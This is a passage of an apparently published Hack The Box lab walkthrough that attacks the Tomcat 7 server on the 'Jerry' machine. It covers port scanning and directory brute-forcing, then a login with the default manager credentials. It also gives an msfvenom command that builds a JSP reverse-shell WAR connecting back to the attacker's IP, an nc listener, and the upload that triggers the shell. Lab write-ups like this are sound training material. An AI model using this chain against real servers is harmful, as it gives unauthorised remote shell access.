</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.99<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9icrodcg3p<span class=o>]</span>─<span class=o>[</span>~/jerry/1_recon<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ ping -c <span class=m>4</span> -n -R <span class=nv>$rhost</span> &gt; connection-test.txt
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.99<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9icrodcg3p<span class=o>]</span>─<span class=o>[</span>~/jerry/1_recon<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ cat connection-test.txt 
</span></span><span class=line><span class=cl>PING 10.129.136.9 <span class=o>(</span>10.129.136.9<span class=o>)</span> 56<span class=o>(</span>124<span class=o>)</span> bytes of data.
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.136.9: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>1</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>127</span> <span class=nv>time</span><span class=o>=</span>10.4 ms
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.136.9: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>2</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>127</span> <span class=nv>time</span><span class=o>=</span>10.0 ms
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.136.9: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>3</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>127</span> <span class=nv>time</span><span class=o>=</span>9.72 ms
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.136.9: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>4</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>127</span> <span class=nv>time</span><span class=o>=</span>12.7 ms
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>--- 10.129.136.9 ping statistics ---
</span></span><span class=line><span class=cl><span class=m>4</span> packets transmitted, <span class=m>4</span> received, 0% packet loss, <span class=nb>time</span> 3005ms
</span></span><span class=line><span class=cl>rtt min/avg/max/mdev <span class=o>=</span> 9.715/10.693/12.663/1.159 ms
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.99<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9icrodcg3p<span class=o>]</span>─<span class=o>[</span>~/jerry/1_recon<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>followed by the usual (syn, version, script, all-ports) <em><strong>tcp</strong></em> <strong>scan</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># shell command</span>
</span></span><span class=line><span class=cl>nmap -Pn -sT -p- -min-rate <span class=m>5000</span> -oN nmap-syn-allports-scan <span class=nv>$rhost</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># command line interaction</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.99<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9icrodcg3p<span class=o>]</span>─<span class=o>[</span>~/jerry/1_recon<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ nmap -Pn -sT -p- -min-rate <span class=m>5000</span> -oN nmap-syn-allports-scan <span class=nv>$rhost</span>
</span></span><span class=line><span class=cl>Starting Nmap 7.93 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2023-05-28 18:00 BST
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.136.9
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.022s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>65534</span> filtered tcp ports <span class=o>(</span>no-response<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT     STATE SERVICE
</span></span><span class=line><span class=cl>8080/tcp open  http-proxy
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 26.46 seconds
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.99<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9icrodcg3p<span class=o>]</span>─<span class=o>[</span>~/jerry/1_recon<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>Only <strong>one</strong> ports seems to be open: port 8080. Let&rsquo;s get some <strong>more details</strong> on that.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># shell command</span>
</span></span><span class=line><span class=cl>nmap -Pn -sT -p <span class=m>8080</span> -sC -sV -oN nmap-syn-script-version-p8080-scan <span class=nv>$rhost</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># command line interaction</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.99<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9icrodcg3p<span class=o>]</span>─<span class=o>[</span>~/jerry/1_recon<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ nmap -Pn -sT -p <span class=m>8080</span> -sC -sV -oN nmap-syn-script-version-p8080-scan <span class=nv>$rhost</span>
</span></span><span class=line><span class=cl>Starting Nmap 7.93 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2023-05-28 18:01 BST
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.136.9
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.011s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT     STATE SERVICE VERSION
</span></span><span class=line><span class=cl>8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Apache Tomcat/7.0.88
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache-Coyote/1.1
</span></span><span class=line><span class=cl><span class=p>|</span>_http-favicon: Apache Tomcat
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 12.50 seconds
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.99<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9icrodcg3p<span class=o>]</span>─<span class=o>[</span>~/jerry/1_recon<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>It appears to be running an <strong>apache tomcat</strong> <strong>webserver</strong>. How about it&rsquo;s <strong>fingerprint</strong>?</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># shell command</span>
</span></span><span class=line><span class=cl>whatweb http://<span class=nv>$rhost</span>:8080/ &gt; whatweb-p8080-fingerprint
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># command line interaction</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.99<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9icrodcg3p<span class=o>]</span>─<span class=o>[</span>~/jerry/1_recon<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ whatweb http://<span class=nv>$rhost</span>:8080/ &gt; whatweb-p8080-fingerprint
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.99<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9icrodcg3p<span class=o>]</span>─<span class=o>[</span>~/jerry/1_recon<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ cat whatweb-p8080-fingerprint 
</span></span><span class=line><span class=cl>http://10.129.136.9:8080/ <span class=o>[</span><span class=m>200</span> OK<span class=o>]</span> Apache, Country<span class=o>[</span>RESERVED<span class=o>][</span>ZZ<span class=o>]</span>, HTML5, HTTPServer<span class=o>[</span>Apache-Coyote/1.1<span class=o>]</span>, IP<span class=o>[</span>10.129.136.9<span class=o>]</span>, Title<span class=o>[</span>Apache Tomcat/7.0.88<span class=o>]</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.99<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9icrodcg3p<span class=o>]</span>─<span class=o>[</span>~/jerry/1_recon<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>We finish up our <em><strong>nmap</strong></em> scans with a quick all-ports <em><strong>udp</strong></em> scan followed by a (simple) os scan. (Definitely do not want to miss any potential <em><strong>udp</strong></em> services.)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># shell command</span>
</span></span><span class=line><span class=cl>sudo nmap -Pn -sU -p- --min-rate <span class=m>10000</span> -oN nmap-udp-allport-scan <span class=nv>$rhost</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># command line interaction</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.99<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9icrodcg3p<span class=o>]</span>─<span class=o>[</span>~/jerry/1_recon<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ sudo nmap -Pn -sU -p- --min-rate <span class=m>10000</span> -oN nmap-udp-allport-scan <span class=nv>$rhost</span>
</span></span><span class=line><span class=cl>Starting Nmap 7.93 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2023-05-28 18:03 BST
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.136.9
</span></span><span class=line><span class=cl>Host is up.
</span></span><span class=line><span class=cl>All <span class=m>65535</span> scanned ports on 10.129.136.9 are in ignored states.
</span></span><span class=line><span class=cl>Not shown: <span class=m>65535</span> open<span class=p>|</span>filtered udp ports <span class=o>(</span>no-response<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 50.87 seconds
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.99<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9icrodcg3p<span class=o>]</span>─<span class=o>[</span>~/jerry/1_recon<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># shell command</span>
</span></span><span class=line><span class=cl>sudo nmap -O -oN nmap-os-scan <span class=nv>$rhost</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># command line interaction</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.99<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9icrodcg3p<span class=o>]</span>─<span class=o>[</span>~/jerry/1_recon<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ sudo nmap -O -oN nmap-os-scan <span class=nv>$rhost</span>
</span></span><span class=line><span class=cl>Starting Nmap 7.93 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2023-05-28 18:28 BST
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.136.9
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.013s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>999</span> filtered tcp ports <span class=o>(</span>no-response<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT     STATE SERVICE
</span></span><span class=line><span class=cl>8080/tcp open  http-proxy
</span></span><span class=line><span class=cl>Warning: OSScan results may be unreliable because we could not find at least <span class=m>1</span> open and <span class=m>1</span> closed port
</span></span><span class=line><span class=cl>Aggressive OS guesses: Microsoft Windows Server <span class=m>2012</span> or Windows Server <span class=m>2012</span> R2 <span class=o>(</span>91%<span class=o>)</span>, Microsoft Windows Server <span class=m>2012</span> R2 <span class=o>(</span>91%<span class=o>)</span>, Microsoft Windows Server <span class=m>2012</span> <span class=o>(</span>90%<span class=o>)</span>, Microsoft Windows <span class=m>7</span> Professional <span class=o>(</span>87%<span class=o>)</span>, Microsoft Windows 8.1 Update <span class=m>1</span> <span class=o>(</span>86%<span class=o>)</span>, Microsoft Windows Phone 7.5 or 8.0 <span class=o>(</span>86%<span class=o>)</span>, Microsoft Windows <span class=m>7</span> or Windows Server <span class=m>2008</span> R2 <span class=o>(</span>85%<span class=o>)</span>, Microsoft Windows Server <span class=m>2008</span> R2 <span class=o>(</span>85%<span class=o>)</span>, Microsoft Windows Server <span class=m>2008</span> R2 or Windows 8.1 <span class=o>(</span>85%<span class=o>)</span>, Microsoft Windows Server <span class=m>2008</span> R2 SP1 or Windows <span class=m>8</span> <span class=o>(</span>85%<span class=o>)</span>
</span></span><span class=line><span class=cl>No exact OS matches <span class=k>for</span> host <span class=o>(</span><span class=nb>test</span> conditions non-ideal<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 11.49 seconds
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.99<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9icrodcg3p<span class=o>]</span>─<span class=o>[</span>~/jerry/1_recon<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>It looks like all <em><strong>udp</strong></em> ports are down and we have a <strong>windows</strong> target on our hands. But before we move on, we do a quick (small, common wordlist) <strong>dir-busting</strong> on the webserver.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># shell command</span>
</span></span><span class=line><span class=cl>gobuster dir -u http://<span class=nv>$rhost</span>:8080/ -w /usr/share/wordlists/dirb/common.txt -q &gt; gobuster-dir-common-enum
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># command line interaction</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.99<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9icrodcg3p<span class=o>]</span>─<span class=o>[</span>~/jerry/1_recon<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ gobuster dir -u http://<span class=nv>$rhost</span>:8080/ -w /usr/share/wordlists/dirb/common.txt -q &gt; gobuster-dir-common-enum
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.99<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9icrodcg3p<span class=o>]</span>─<span class=o>[</span>~/jerry/1_recon<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ cat gobuster-dir-common-enum 
</span></span><span class=line><span class=cl>/aux                  <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span>
</span></span><span class=line><span class=cl>/com1                 <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span>
</span></span><span class=line><span class=cl>/com2                 <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span>
</span></span><span class=line><span class=cl>/com3                 <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span>
</span></span><span class=line><span class=cl>/con                  <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span>
</span></span><span class=line><span class=cl>/docs                 <span class=o>(</span>Status: 302<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span> <span class=o>[</span>--&gt; /docs/<span class=o>]</span>
</span></span><span class=line><span class=cl>/examples             <span class=o>(</span>Status: 302<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span> <span class=o>[</span>--&gt; /examples/<span class=o>]</span>
</span></span><span class=line><span class=cl>/favicon.ico          <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 21630<span class=o>]</span>             
</span></span><span class=line><span class=cl>/host-manager         <span class=o>(</span>Status: 302<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span> <span class=o>[</span>--&gt; /host-manager/<span class=o>]</span>
</span></span><span class=line><span class=cl>/lpt1                 <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span>                     
</span></span><span class=line><span class=cl>/lpt2                 <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span>                     
</span></span><span class=line><span class=cl>/manager              <span class=o>(</span>Status: 302<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span> <span class=o>[</span>--&gt; /manager/<span class=o>]</span>     
</span></span><span class=line><span class=cl>/nul                  <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span>                     
</span></span><span class=line><span class=cl>/prn                  <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span>                     
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.99<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9icrodcg3p<span class=o>]</span>─<span class=o>[</span>~/jerry/1_recon<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>We <strong>note the results</strong> and we move on.</p><p>It&rsquo;s time to fire up our web <strong>browser</strong> and check out that aforementioned <strong>webpage</strong>. It looks like a <em>default</em> welcoming site one would get after a successful installation. The part which especially <strong>stands out</strong> is the displayed <strong>apache tomcat</strong> version: - <em>Apache Tomcat/7.0.88</em> -.</p><p><img loading=lazy src=/walkthroughs/htb/beginner-track/jerry/webpage.png alt=webpage title=webpage></p><p><strong>Goofing around</strong> a bit, we <strong>notice</strong> a couple of things:</p><ul><li>only the tabs <em>Documentation</em>, <em>Configuration</em>, <em>Examples</em> do redirect to sites that are hosted by the target</li><li>login for - <em>http://$rhost:8080/manager/status</em> - (accessible via <em><strong>Server Status</strong></em>) is quite easy with the <strong>default credentials</strong> - <em>admin:admin</em> -</li><li>login for - <em>http://$rhost:8080/manager/html</em> - (accessible via <em><strong>Manager App</strong></em>) and requires <strong>other login credentials</strong></li><li>login for - <em>http://$rhost:8080/host-manager/html</em> - (accessible via <em><strong>Host Manager</strong></em>) and requires <strong>other login credentials</strong></li><li>there are some <strong>default credentials</strong> - <em>tomcat:s3cret</em> - mentioned for the <em><strong>Manager App</strong></em></li></ul><p><img loading=lazy src=/walkthroughs/htb/beginner-track/jerry/manager-app-creds.png alt=manager-app-creds title=manager-app-creds></p><p>Sadly, <strong>accessing</strong> the <strong>server status</strong> webpage proves unhelpful - there is simply not much we can do here.</p><p><img loading=lazy src=/walkthroughs/htb/beginner-track/jerry/manager-status.png alt=manager-status title=manager-status></p><p>Accessing the <em><strong>Manager App</strong></em> on the other hand looks very <strong>promising</strong>. Not only were the <strong>default credentials</strong> - <em>tomcat:s3cret</em> - not changed, but the <em>Tomcat Web Application Manager</em> just provided us with some <strong>file upload</strong> capabilities.</p><p><img loading=lazy src=/walkthroughs/htb/beginner-track/jerry/manager-app-access.png alt=manager-app-access title=manager-app-access></p><p>Moreover, there are some <strong>potentially</strong> very important <strong>pieces of information</strong> at the bottom of the page under <em>Server Information</em>:</p><ul><li>Tomcat Version &ndash;> Apache Tomcat/7.0.88</li><li>JVM Version &ndash;> 1.8.0_171-b11</li><li>JVM Vendor &ndash;> Oracle Corporation</li><li>OS Name &ndash;> Windows Server 2012 R2</li><li>OS Version &ndash;> 6.3</li><li>OS Architecture &ndash;> amd64</li><li>Hostname &ndash;> JERRY</li><li>IP Address &ndash;> 10.129.136.9</li></ul><p>Before we capitalize on the <strong>file upload</strong> functionality, let&rsquo;s try the <strong>same default credentials</strong> on the <em><strong>Host Manager</strong></em>. No luck this time - still worth a try though.</p><p>Looking around for an appropriate payload (WAR files are mentioned) we came across the <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md title="PayloadAllTheThings website">PayloadAllTheThings website</a> mentioning the following:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msfvenom -p java/jsp_shell_reverse_tcp <span class=nv>LHOST</span><span class=o>=</span>10.0.0.1 <span class=nv>LPORT</span><span class=o>=</span><span class=m>4242</span> -f war &gt; reverse.war
</span></span><span class=line><span class=cl>strings reverse.war <span class=p>|</span> grep jsp <span class=c1># in order to get the name of the file</span>
</span></span></code></pre></div><p>So in a nutshell, we use <em><strong>msfvenom</strong></em> to create a <em><strong>java</strong></em> <strong>reverse shell</strong> in a <em><strong>war</strong></em> packeting format and then we look for the exact <em><strong>jsp</strong></em> file within this <em><strong>war</strong></em> archive.</p><h2 id=exploitation><strong>EXPLOITATION</strong><a hidden class=anchor aria-hidden=true href=#exploitation>#</a></h2><p>Adjusting our <strong>payload creation</strong> a bit by especially <strong>specifying</strong> our target&rsquo;s <strong>architecture</strong> (amd64 &ndash;> x64) as a 64bit architecture and <strong>modifying</strong> the local host/port to match our <strong>pwnbox</strong>&rsquo;s ip address should do it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># shell command</span>
</span></span><span class=line><span class=cl>msfvenom -p java/jsp_shell_reverse_tcp -a x64 -f war <span class=nv>LHOST</span><span class=o>=</span>10.10.14.99 <span class=nv>LPORT</span><span class=o>=</span><span class=m>4444</span> &gt; revshell.war
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># command line interaction</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.99<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9icrodcg3p<span class=o>]</span>─<span class=o>[</span>~/jerry/2_exploitation<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ msfvenom -p java/jsp_shell_reverse_tcp -a x64 -f war <span class=nv>LHOST</span><span class=o>=</span>10.10.14.99 <span class=nv>LPORT</span><span class=o>=</span><span class=m>4444</span> &gt; revshell.war
</span></span><span class=line><span class=cl>Payload size: <span class=m>1087</span> bytes
</span></span><span class=line><span class=cl>Final size of war file: <span class=m>1087</span> bytes
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.99<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9icrodcg3p<span class=o>]</span>─<span class=o>[</span>~/jerry/2_exploitation<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ ll
</span></span><span class=line><span class=cl>total 4.0K
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> htb-bluewalle htb-bluewalle 1.1K May <span class=m>28</span> 19:30 revshell.war
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.99<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9icrodcg3p<span class=o>]</span>─<span class=o>[</span>~/jerry/2_exploitation<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ file revshell.war 
</span></span><span class=line><span class=cl>revshell.war: Zip archive data, at least v2.0 to extract
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.99<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9icrodcg3p<span class=o>]</span>─<span class=o>[</span>~/jerry/2_exploitation<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>As instructed, let&rsquo;s search for the <strong>jsp</strong> file that&rsquo;s <strong>hidden inside</strong> the <em><strong>war</strong></em> archive. Maybe it we will need it for later?</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># shell command</span>
</span></span><span class=line><span class=cl>strings revshell.war <span class=p>|</span> grep jsp
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># command line interaction</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.99<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9icrodcg3p<span class=o>]</span>─<span class=o>[</span>~/jerry/2_exploitation<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ strings revshell.war <span class=p>|</span> grep jsp
</span></span><span class=line><span class=cl>nkvbztft.jsp<span class=o>}</span>T<span class=o>]</span>k
</span></span><span class=line><span class=cl>nkvbztft.jspPK
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.99<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9icrodcg3p<span class=o>]</span>─<span class=o>[</span>~/jerry/2_exploitation<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>Before we upload our <strong>reverse shell</strong> we <strong>start</strong> a <strong>netcat listener</strong> to catch when our <strong>target</strong> tries <strong>connecting back</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># shell command</span>
</span></span><span class=line><span class=cl>nc -lvnp <span class=m>4444</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># command line interaction</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.99<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9icrodcg3p<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ nc -lvnp <span class=m>4444</span>
</span></span><span class=line><span class=cl>Ncat: Version 7.93 <span class=o>(</span> https://nmap.org/ncat <span class=o>)</span>
</span></span><span class=line><span class=cl>Ncat: Listening on :::4444
</span></span><span class=line><span class=cl>Ncat: Listening on 0.0.0.0:4444
</span></span></code></pre></div><p>Since we are done with the preparations, let&rsquo;s <strong>upload</strong> it.</p><p><img loading=lazy src=/walkthroughs/htb/beginner-track/jerry/manager-app-upload.png alt=manager-app-upload title=manager-app-upload></p><p>Once <strong>uploaded</strong>, our <strong>reverse shell</strong> listed and made available under <em>Applications</em>.</p><p><img loading=lazy src=/walkthroughs/htb/beginner-track/jerry/manager-app-upload-success.png alt=manager-app-upload-success title=manager-app-upload-success></p><p>Accessing it - <em>http://$rhost:8080/revshell/</em> - lands us a connection in our <strong>netcat</strong> listener.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># reverse shell connecting back - caught in our netcat listener</span>
